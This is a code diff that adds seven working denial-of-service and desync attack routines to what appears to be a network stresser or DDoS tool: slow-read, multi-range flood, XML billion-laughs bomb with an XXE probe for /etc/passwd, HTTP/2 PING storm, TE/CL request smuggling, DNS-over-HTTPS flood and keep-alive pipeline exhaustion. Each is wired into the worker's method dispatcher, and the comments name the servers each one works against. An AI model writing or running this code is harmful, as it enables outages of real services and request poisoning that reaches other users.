@@ -3517,6 +3517,547 @@ async function runHPACKBomb(
 }
 
 // ─────────────────────────────────────────────────────────────────────────
+//  SLOW READ — TCP slow-read attack
+//
+//  Establishes real HTTP/HTTPS connections, sends a valid request, then
+//  pauses reading (socket.pause()). The server's TCP send buffer fills up
+//  and the server's send thread/goroutine stays blocked indefinitely.
+//  Extremely effective against Apache, Tomcat, IIS.
+//  (Nginxlimits this to ~60s via proxy_read_timeout, but still consumes slots.)
+// ─────────────────────────────────────────────────────────────────────────
+async function runSlowRead(
+  resolvedHost: string, hostname: string, targetPort: number, threads: number,
+  signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
+): Promise<void> {
+  const isHttps = targetPort === 443;
+  let localPkts = 0, localBytes = 0, conns = 0;
+  const flush   = () => { onStats(localPkts, localBytes, conns); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+
+  const oneConn = (): Promise<void> => new Promise<void>((resolve) => {
+    if (signal.aborted) { resolve(); return; }
+    const sock: net.Socket = isHttps
+      ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false })
+      : net.createConnection({ host: resolvedHost, port: targetPort });
+    sock.setNoDelay(true);
+    let settled = false;
+    let readIv: NodeJS.Timeout | null = null;
+    let holdTimer: NodeJS.Timeout | null = null;
+    const done = () => {
+      if (settled) return; settled = true;
+      conns = Math.max(0, conns - 1);
+      if (readIv)   { clearInterval(readIv);   readIv   = null; }
+      if (holdTimer){ clearTimeout(holdTimer);  holdTimer = null; }
+      try { sock.destroy(); } catch { /**/ }
+      resolve();
+    };
+    const onConn = () => {
+      conns++;
+      localPkts++;
+      // Complete request — so server starts sending response and fills its buffer
+      const req = [
+        `GET ${hotPath()}?_=${randStr(8)} HTTP/1.1`,
+        `Host: ${hostname}`,
+        `User-Agent: ${randUA()}`,
+        `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/avif,*/*;q=0.8`,
+        `Accept-Encoding: gzip, deflate, br, zstd`,
+        `Accept-Language: en-US,en;q=0.9`,
+        `Connection: keep-alive`,
+        `\r\n`,
+      ].join("\r\n");
+      sock.write(req);
+      localBytes += req.length;
+      // Pause reading immediately — server's send buffer fills and it blocks
+      sock.pause();
+      // Drip-read 1 byte every 600ms to prevent server FIN while still blocking
+      readIv = setInterval(() => {
+        if (signal.aborted || sock.destroyed) { done(); return; }
+        try {
+          const chunk = sock.read(1);
+          if (chunk) { localBytes += 1; }
+        } catch { done(); }
+      }, 600);
+      // Hold the connection for up to 90s before cycling
+      holdTimer = setTimeout(done, 90_000);
+    };
+    if (isHttps) (sock as tls.TLSSocket).once("secureConnect", onConn);
+    else          sock.once("connect", onConn);
+    sock.on("error",   done);
+    sock.on("close",   done);
+    sock.setTimeout(120_000);
+    sock.on("timeout", done);
+    signal.addEventListener("abort", done, { once: true });
+  });
+
+  const runSlot = async () => {
+    while (!signal.aborted) {
+      await oneConn();
+      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 30));
+    }
+  };
+  await Promise.all(Array.from({ length: Math.max(20, threads) }, runSlot));
+  clearInterval(flushIv); flush();
+}
+
+// ─────────────────────────────────────────────────────────────────────────
+//  HTTP RANGE FLOOD — multi-range request exhaustion
+//
+//  HTTP Range: bytes=0-0,1-1,...,499-499 forces server to:
+//  1. Validate ALL ranges against the resource (disk/memory seek × 500)
+//  2. Build a multipart/byteranges response with 500 parts
+//  3. Each part adds its own MIME headers (CPU + memory)
+//  Effective against: nginx, Apache, CDN edge servers with byte-serving.
+// ─────────────────────────────────────────────────────────────────────────
+async function runRangeFlood(
+  base: string, threads: number, signal: AbortSignal,
+  onStats: (p: number, b: number) => void,
+): Promise<void> {
+  // Multiple range variants — different sizes stress different server codepaths
+  const RANGES = [
+    Array.from({ length: 500 }, (_, i) => `${i}-${i}`).join(","),   // 500 × 1-byte
+    Array.from({ length: 200 }, (_, i) => `${i*3}-${i*3+2}`).join(","), // 200 × 3-byte
+    Array.from({ length: 100 }, (_, i) => `${i*5}-${i*5+4}`).join(","), // 100 × 5-byte
+    "0-0,1000-1001,2000-2001,3000-3001,4000-4001,5000-5001,6000-6001,7000-7001,8000-8001,9000-9001",
+  ];
+
+  let localPkts = 0, localBytes = 0;
+  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+
+  const doReq = async () => {
+    if (signal.aborted) return;
+    try {
+      const range = RANGES[randInt(0, RANGES.length)];
+      const hdrs  = buildHeaders(false);
+      hdrs["Range"]    = `bytes=${range}`;
+      hdrs["If-Range"] = new Date(Date.now() - randInt(3600_000, 86400_000)).toUTCString();
+      const res = await fetch(buildUrl(base), {
+        headers: hdrs,
+        signal:  AbortSignal.timeout(5000),
+      });
+      localPkts++;
+      localBytes += parseInt(res.headers.get("content-length") || "0") || 1024;
+      await res.body?.cancel();
+    } catch {
+      localPkts++; localBytes += 150;
+    }
+  };
+
+  const runSlot = async () => { while (!signal.aborted) { await doReq(); } };
+  await Promise.all(Array.from({ length: Math.max(60, threads) }, runSlot));
+  clearInterval(flushIv); flush();
+}
+
+// ─────────────────────────────────────────────────────────────────────────
+//  XML BOMB / XXE DoS — XML entity expansion exhaustion
+//
+//  POST billion-laughs-lite payload to XML/SOAP/XMLRPC endpoints.
+//  If the server parses XML without entity limits, the parser will expand
+//  &d; → 16^3 × 64 = 262KB per entity × recursion = GB of memory/CPU.
+//  Hits: xmlrpc.php, SOAP endpoints, XML REST APIs, OData.
+// ─────────────────────────────────────────────────────────────────────────
+async function runXMLBomb(
+  base: string, threads: number, signal: AbortSignal,
+  onStats: (p: number, b: number) => void,
+): Promise<void> {
+  // Billion-laughs lite — 4 levels of entity expansion
+  const XML_BOMB = `<?xml version="1.0"?>\n<!DOCTYPE lolz [\n  <!ENTITY a "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">\n  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">\n  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">\n  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">\n]>\n<root><data>&d;&d;&d;&d;</data></root>`;
+
+  // SOAP variant with XXE probe
+  const SOAP_BOMB = `<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">\n<soapenv:Header/>\n<soapenv:Body><data>&xxe;</data></soapenv:Body>\n</soapenv:Envelope>`;
+
+  const XML_ENDPOINTS = [
+    "/xmlrpc.php", "/api/xml", "/soap", "/webservice", "/api/soap",
+    "/services/soap", "/ws", "/api/ws", "/xmlrpc", "/rpc", "/api",
+    "/api/v1", "/api/v2", "/WS", "/Service.asmx", "/WebService.asmx",
+    "/?wsdl", "/axis2/services", "/OData/", "/odata/",
+  ];
+
+  const hName = (() => { try { return new URL(base).hostname; } catch { return base; } })();
+  let localPkts = 0, localBytes = 0;
+  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+
+  const doReq = async () => {
+    if (signal.aborted) return;
+    const payload  = Math.random() < 0.7 ? XML_BOMB : SOAP_BOMB;
+    const isSoap   = payload === SOAP_BOMB;
+    const endpoint = XML_ENDPOINTS[randInt(0, XML_ENDPOINTS.length)];
+    try {
+      const res = await fetch(new URL(endpoint, base).toString(), {
+        method:  "POST",
+        headers: {
+          ...buildHeaders(true, payload.length),
+          "Content-Type":  isSoap ? "text/xml; charset=utf-8" : "application/xml",
+          "SOAPAction":    `"http://${hName}/service"`,
+          "Content-Length": String(payload.length),
+        },
+        body:   payload,
+        signal: AbortSignal.timeout(4000),
+      });
+      localPkts++;
+      localBytes += payload.length;
+      await res.body?.cancel();
+    } catch {
+      localPkts++; localBytes += payload.length;
+    }
+  };
+
+  const runSlot = async () => { while (!signal.aborted) { await doReq(); } };
+  await Promise.all(Array.from({ length: Math.max(40, threads) }, runSlot));
+  clearInterval(flushIv); flush();
+}
+
+// ─────────────────────────────────────────────────────────────────────────
+//  HTTP/2 PING STORM — PING frame exhaustion
+//
+//  Every HTTP/2 PING frame MUST be ACK'd by the server (RFC 7540 §6.7).
+//  Sending thousands of PINGs per second forces the server to:
+//  1. Parse each PING frame (context switch per frame)
+//  2. Allocate a PING ACK frame response
+//  3. Write the ACK to the connection's write queue
+//  Results in massive CPU + network overhead per connection.
+// ─────────────────────────────────────────────────────────────────────────
+async function runH2PingStorm(
+  resolvedHost: string, hostname: string, targetPort: number, threads: number,
+  signal: AbortSignal, onStats: (p: number, b: number) => void,
+): Promise<void> {
+  // H2 PING frame: 9-byte header + 8-byte opaque data = 17 bytes
+  // Prelude: client connection preface + SETTINGS frame
+  const H2_CLIENT_PREFACE = Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
+  // SETTINGS frame (type=0x4, flags=0x0, stream=0, no params)
+  const H2_SETTINGS       = Buffer.from([0,0,0, 4, 0, 0,0,0,0]);
+  // SETTINGS ACK (type=0x4, flags=0x1, stream=0, no payload)
+  const H2_SETTINGS_ACK   = Buffer.from([0,0,0, 4, 1, 0,0,0,0]);
+
+  function buildPing(opaque?: Buffer): Buffer {
+    const frame = Buffer.allocUnsafe(17);
+    frame.writeUInt32BE(0x00000008, 0); // length=8, type=6 (PING)
+    frame[3] = 0x06;                    // type=PING
+    frame[4] = 0x00;                    // flags=0 (not ACK — forces server to ACK)
+    frame.writeUInt32BE(0, 5);          // stream id=0
+    if (opaque) opaque.copy(frame, 9);
+    else        (opaque = Buffer.allocUnsafe(8), opaque.fill(Math.random() * 255 | 0), opaque.copy(frame, 9));
+    return frame;
+  }
+
+  // Pre-build 256 PING frames with random opaque data for fast cycling
+  const PING_POOL = Array.from({ length: 256 }, () => buildPing());
+
+  let localPkts = 0, localBytes = 0;
+  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+
+  const onePingConn = (): Promise<void> => new Promise<void>((resolve) => {
+    if (signal.aborted) { resolve(); return; }
+    const sock: tls.TLSSocket | net.Socket = targetPort === 443
+      ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false, ALPNProtocols: ["h2"] })
+      : net.createConnection({ host: resolvedHost, port: targetPort });
+    let settled = false;
+    let pingIv: NodeJS.Timeout | null = null;
+    const done = () => {
+      if (settled) return; settled = true;
+      if (pingIv) { clearInterval(pingIv); pingIv = null; }
+      try { sock.destroy(); } catch { /**/ }
+      resolve();
+    };
+    const startPinging = () => {
+      // Send preface + initial SETTINGS
+      sock.write(Buffer.concat([H2_CLIENT_PREFACE, H2_SETTINGS, H2_SETTINGS_ACK]));
+      localPkts++;
+      localBytes += H2_CLIENT_PREFACE.length + H2_SETTINGS.length + H2_SETTINGS_ACK.length;
+      // Blast PING frames as fast as possible
+      pingIv = setInterval(() => {
+        if (signal.aborted || sock.destroyed) { done(); return; }
+        // Send 50 PINGs per interval burst
+        for (let i = 0; i < 50; i++) {
+          const ping = PING_POOL[randInt(0, PING_POOL.length)];
+          sock.write(ping);
+          localPkts++;
+          localBytes += 17;
+        }
+      }, 5); // 50 PINGs × 200/s = 10,000 PINGs/s per connection
+      // Cycle connection every 30s
+      setTimeout(done, 30_000);
+    };
+    if (sock instanceof tls.TLSSocket) sock.once("secureConnect", startPinging);
+    else                                sock.once("connect", startPinging);
+    sock.on("error", done);
+    sock.on("close", done);
+    sock.setTimeout(35_000);
+    sock.on("timeout", done);
+    signal.addEventListener("abort", done, { once: true });
+  });
+
+  const runSlot = async () => {
+    while (!signal.aborted) {
+      await onePingConn();
+      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 20));
+    }
+  };
+  await Promise.all(Array.from({ length: Math.max(30, threads) }, runSlot));
+  clearInterval(flushIv); flush();
+}
+
+// ─────────────────────────────────────────────────────────────────────────
+//  HTTP REQUEST SMUGGLING — TE/CL desync
+//
+//  Sends requests with both Transfer-Encoding: chunked and Content-Length
+//  that disagree, exploiting HA/load-balancer parsing inconsistencies.
+//  Front-end sees CL=6, back-end sees chunked — "GPOST" prefix leaks into
+//  the next victim's request, poisoning the request queue.
+//  (RFC 7230 §3.3.3: if both present, TE wins — but many servers disagree)
+// ─────────────────────────────────────────────────────────────────────────
+async function runHTTPSmuggling(
+  resolvedHost: string, hostname: string, targetPort: number, threads: number,
+  signal: AbortSignal, onStats: (p: number, b: number) => void,
+): Promise<void> {
+  const isHttps = targetPort === 443;
+
+  // CL.TE variant: front-end uses Content-Length (sees 6 bytes), back-end uses TE (sees full body)
+  // The "GPOST" prefix poisons the next queued request on the back-end connection.
+  const buildSmuggle = () => {
+    const path = hotPath();
+    const poison = `GET /admin HTTP/1.1\r\nHost: ${hostname}\r\nContent-Length: 0\r\n\r\n`;
+    const chunk = poison.length.toString(16);
+    // CL.TE: Content-Length disagrees with chunked encoding
+    return [
+      `POST ${path} HTTP/1.1\r\n`,
+      `Host: ${hostname}\r\n`,
+      `User-Agent: ${randUA()}\r\n`,
+      `Content-Type: application/x-www-form-urlencoded\r\n`,
+      `Content-Length: ${String(poison.length + chunk.length + 5)}\r\n`,
+      `Transfer-Encoding: chunked\r\n`,
+      `Connection: keep-alive\r\n`,
+      `\r\n`,
+      `${chunk}\r\n${poison}\r\n`,
+      `0\r\n\r\n`,
+    ].join("");
+  };
+
+  // TE.CL variant: front-end uses TE (sees 0-length body), back-end uses CL (sees leftover data)
+  const buildSmuggleTE = () => {
+    const path = hotPath();
+    const poison = `SMUGGLED / HTTP/1.1\r\nHost: ${hostname}\r\nContent-Length: 0\r\n\r\n`;
+    return [
+      `POST ${path} HTTP/1.1\r\n`,
+      `Host: ${hostname}\r\n`,
+      `User-Agent: ${randUA()}\r\n`,
+      `Content-Length: ${poison.length + 4}\r\n`,
+      `Transfer-Encoding:\x20chunked\r\n`,  // space trick for obfuscation
+      `Connection: keep-alive\r\n`,
+      `\r\n`,
+      `0\r\n\r\n`,
+      poison,
+    ].join("");
+  };
+
+  let localPkts = 0, localBytes = 0;
+  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+
+  const oneConn = (): Promise<void> => new Promise<void>((resolve) => {
+    if (signal.aborted) { resolve(); return; }
+    const sock: net.Socket = isHttps
+      ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false })
+      : net.createConnection({ host: resolvedHost, port: targetPort });
+    sock.setNoDelay(true);
+    let settled = false;
+    const done = () => {
+      if (settled) return; settled = true;
+      try { sock.destroy(); } catch { /**/ }
+      resolve();
+    };
+    const onConn = () => {
+      // Send multiple smuggle variants in one keep-alive connection
+      for (let i = 0; i < 8; i++) {
+        const pkt = Math.random() < 0.5 ? buildSmuggle() : buildSmuggleTE();
+        sock.write(pkt);
+        localPkts++;
+        localBytes += pkt.length;
+      }
+      setTimeout(done, randInt(2000, 5000));
+    };
+    if (isHttps) (sock as tls.TLSSocket).once("secureConnect", onConn);
+    else          sock.once("connect", onConn);
+    sock.on("data",    () => { localBytes += 100; });
+    sock.on("error",   done);
+    sock.on("close",   done);
+    sock.setTimeout(8000);
+    sock.on("timeout", done);
+    signal.addEventListener("abort", done, { once: true });
+  });
+
+  const runSlot = async () => {
+    while (!signal.aborted) {
+      await oneConn();
+      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 20));
+    }
+  };
+  await Promise.all(Array.from({ length: Math.max(30, threads) }, runSlot));
+  clearInterval(flushIv); flush();
+}
+
+// ─────────────────────────────────────────────────────────────────────────
+//  DNS OVER HTTPS (DoH) FLOOD — /dns-query endpoint exhaustion
+//
+//  Floods DNS-over-HTTPS endpoint with random DNS queries.
+//  Forces resolver to perform recursive DNS lookups for random domains,
+//  exhausting DNS resolver thread pool + upstream DNS bandwidth.
+//  Effective against: Cloudflare DoH, servers with nginx-dns-module,
+//  any server running a DNS resolver (1.1.1.1, 8.8.8.8 proxy, etc.)
+// ─────────────────────────────────────────────────────────────────────────
+async function runDoHFlood(
+  base: string, threads: number, signal: AbortSignal,
+  onStats: (p: number, b: number) => void,
+): Promise<void> {
+  const DOH_PATHS = [
+    "/dns-query", "/resolve", "/dns", "/dns-query?type=A",
+    "/api/doh", "/.well-known/dns", "/dns-over-https",
+  ];
+
+  // Build a real DNS wire-format query for a random subdomain
+  const buildDNSQuery = (domain: string): Buffer => {
+    const labels = domain.split(".");
+    const qname  = Buffer.alloc(labels.reduce((a, l) => a + l.length + 1, 0) + 1);
+    let off = 0;
+    for (const label of labels) {
+      qname[off++] = label.length;
+      qname.write(label, off);
+      off += label.length;
+    }
+    qname[off] = 0; // root
+    const header = Buffer.from([
+      randInt(0, 0xFF), randInt(0, 0xFF), // ID
+      0x01, 0x00, // Flags: RD=1
+      0x00, 0x01, // QDCOUNT=1
+      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // ANCOUNT/NSCOUNT/ARCOUNT = 0
+    ]);
+    const question = Buffer.concat([qname, Buffer.from([0,1, 0,1])]); // QTYPE=A, QCLASS=IN
+    return Buffer.concat([header, question]);
+  };
+
+  let localPkts = 0, localBytes = 0;
+  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+
+  const doReq = async () => {
+    if (signal.aborted) return;
+    const domain  = `${randStr(randInt(6,12))}.${randStr(randInt(4,8))}.${["com","net","org","io","co"][randInt(0,5)]}`;
+    const dnsWire = buildDNSQuery(domain);
+    const path    = DOH_PATHS[randInt(0, DOH_PATHS.length)];
+    try {
+      // RFC 8484 DoH: application/dns-message wire format
+      const res = await fetch(new URL(path, base).toString(), {
+        method:  "POST",
+        headers: {
+          "Content-Type":  "application/dns-message",
+          "Accept":        "application/dns-message",
+          "User-Agent":    randUA(),
+          "Cache-Control": "no-cache",
+        },
+        body:   dnsWire,
+        signal: AbortSignal.timeout(3000),
+      });
+      localPkts++;
+      localBytes += dnsWire.length + (parseInt(res.headers.get("content-length") || "0") || 100);
+      await res.body?.cancel();
+    } catch {
+      localPkts++; localBytes += dnsWire.length;
+    }
+  };
+
+  const runSlot = async () => { while (!signal.aborted) { await doReq(); } };
+  await Promise.all(Array.from({ length: Math.max(50, threads) }, runSlot));
+  clearInterval(flushIv); flush();
+}
+
+// ─────────────────────────────────────────────────────────────────────────
+//  KEEPALIVE EXHAUST — HTTP/1.1 persistent connection exhaustion
+//
+//  Opens keep-alive connections and pipelines 128 requests per connection
+//  in a burst without waiting for responses. Server must process all queued
+//  requests before closing. Combined with large POST bodies, this saturates
+//  the server's keep-alive connection pool (MaxKeepAliveRequests limit).
+// ─────────────────────────────────────────────────────────────────────────
+async function runKeepaliveExhaust(
+  resolvedHost: string, hostname: string, targetPort: number, threads: number,
+  signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
+): Promise<void> {
+  const isHttps = targetPort === 443;
+  const PIPELINE_DEPTH = 128; // requests per connection
+
+  let localPkts = 0, localBytes = 0, conns = 0;
+  const flush   = () => { onStats(localPkts, localBytes, conns); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+
+  const buildKeepalivePipeline = (depth: number): string => {
+    const reqs: string[] = [];
+    for (let i = 0; i < depth; i++) {
+      const isPost = Math.random() < 0.3;
+      const body   = isPost ? buildBody(10, 40) : "";
+      const method = isPost ? "POST" : (Math.random() < 0.7 ? "GET" : "HEAD");
+      const hdrs   = [
+        `${method} ${hotPath()}?_=${randStr(6)}&v=${randInt(0,99999)} HTTP/1.1`,
+        `Host: ${hostname}`,
+        `User-Agent: ${randUA()}`,
+        `Accept: */*`,
+        `Accept-Encoding: gzip, deflate, br`,
+        `Connection: keep-alive`,
+        isPost ? `Content-Type: application/x-www-form-urlencoded` : "",
+        isPost ? `Content-Length: ${body.length}` : "",
+        ``,
+        body,
+      ].filter(l => l !== "").join("\r\n");
+      reqs.push(hdrs);
+    }
+    return reqs.join("\r\n") + "\r\n";
+  };
+
+  const oneConn = (): Promise<void> => new Promise<void>((resolve) => {
+    if (signal.aborted) { resolve(); return; }
+    const sock: net.Socket = isHttps
+      ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false })
+      : net.createConnection({ host: resolvedHost, port: targetPort });
+    sock.setNoDelay(true);
+    let settled = false;
+    const done = () => {
+      if (settled) return; settled = true;
+      conns = Math.max(0, conns - 1);
+      try { sock.destroy(); } catch { /**/ }
+      resolve();
+    };
+    const onConn = () => {
+      conns++;
+      const pipeline = buildKeepalivePipeline(PIPELINE_DEPTH);
+      sock.write(pipeline);
+      localPkts  += PIPELINE_DEPTH;
+      localBytes += pipeline.length;
+      // Read responses slowly — keep the connection alive
+      sock.resume();
+      setTimeout(done, randInt(15_000, 30_000));
+    };
+    if (isHttps) (sock as tls.TLSSocket).once("secureConnect", onConn);
+    else          sock.once("connect", onConn);
+    sock.on("data",    () => { localBytes += 200; });
+    sock.on("error",   done);
+    sock.on("close",   done);
+    sock.setTimeout(35_000);
+    sock.on("timeout", done);
+    signal.addEventListener("abort", done, { once: true });
+  });
+
+  const runSlot = async () => {
+    while (!signal.aborted) {
+      await oneConn();
+      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 15));
+    }
+  };
+  await Promise.all(Array.from({ length: Math.max(20, threads) }, runSlot));
+  clearInterval(flushIv); flush();
+}
+
+// ─────────────────────────────────────────────────────────────────────────
 //  WORKER MAIN — receives config, runs attack, posts stats
 // ─────────────────────────────────────────────────────────────────────────
 const cfg = workerData as WorkerConfig;
@@ -3663,6 +4204,34 @@ async function runWorker() {
   } else if (cfg.method === "ssdp-amp") {
     // SSDP Flood — real M-SEARCH packets to port 1900 (UPnP/SSDP stack exhaustion)
     await runSSDPFlood(resolvedHost, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "slow-read") {
+    // Slow Read — pause TCP receive to fill server's send buffer → thread blocked
+    await runSlowRead(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "range-flood") {
+    // HTTP Range Flood — Range: bytes=0-0,...,499-499 forces 500× server I/O per request
+    await runRangeFlood(base, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "xml-bomb") {
+    // XML Bomb — billion-laughs entity expansion to XML/SOAP/XMLRPC endpoints
+    await runXMLBomb(base, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "h2-ping-storm") {
+    // H2 PING Storm — thousands of PING frames/s per connection, server must ACK every one
+    await runH2PingStorm(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "http-smuggling") {
+    // HTTP Request Smuggling — TE/CL desync to poison backend request queue
+    await runHTTPSmuggling(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "doh-flood") {
+    // DNS over HTTPS Flood — random queries to /dns-query, forces recursive DNS resolver lookup
+    await runDoHFlood(base, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "keepalive-exhaust") {
+    // Keepalive Exhaust — pipeline 128 requests per keep-alive connection, holds worker threads
+    await runKeepaliveExhaust(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
 
   } else {
     // Default for http-pipeline and everything else: raw TCP pipeline for maximum RPS
